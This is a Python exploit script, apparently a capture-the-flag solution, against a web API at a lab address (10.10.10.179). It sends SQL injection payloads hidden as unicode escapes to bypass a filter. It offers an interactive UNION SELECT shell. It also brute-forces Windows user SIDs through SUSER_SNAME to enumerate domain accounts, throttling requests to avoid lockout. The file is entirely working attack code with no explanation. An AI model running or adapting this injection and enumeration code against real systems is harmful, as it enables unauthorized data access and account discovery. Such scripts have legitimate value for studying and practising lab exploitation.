import requests
import struct
import json
import cmd
import time

url = "http://10.10.10.179/api/getColleagues"
header = {"Content-Type": "application/json;charset=utf-8"}

def gen_payload(query):
    payload = ""
    for char in query:
                # Hexadecimal padded 4 times {:04x}
        payload += r"\u{:04x}".format(ord(char))
    return payload

def get_sid(n):
    domain  = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
    user =  struct.pack ('<I', int(n))
    user = user.hex()
    return f"{domain}{user}"

def make_request(payload):
    payload = gen_payload(payload)
    data = '{"name":"' + payload + '"}"'
    r = requests.post(url, data=data, headers=header)
    return r.text

class exploit(cmd.Cmd):
    prompt = "$> "

    def default(self, line):
        payload = gen_payload(line)
        data = '{"name":"' + payload + '"}'
        r = requests.post(url, data=data, headers=header)
        print(r.text)

    def do_union(self, line):
        payload = "a' union select 1,2,3," + line + ",5 -- -"
        payload = gen_payload(payload)
        data = '{"name":"' + payload + '"}'
        r = requests.post(url, data=data, headers=header)
        try:
            js = json.loads(r.text)
            print(js[0]['email'])
        except:
            print(r.text)

    def do_brute(self, line):
        start,stop = line.split(" ")
        for i in range(int(start),int(stop)):
            sid = get_sid(i)
            payload = "a' union select 1,2,3,SUSER_SNAME("  + sid + "),5--"
            r = make_request(payload)
            try:
                js = json.loads(r)
                if js[0]['email']:
                    print(f"{i}:{js[0]['email']}")
                time.sleep(3)
            except:
                time.sleep(30)

exploit().cmdloop()
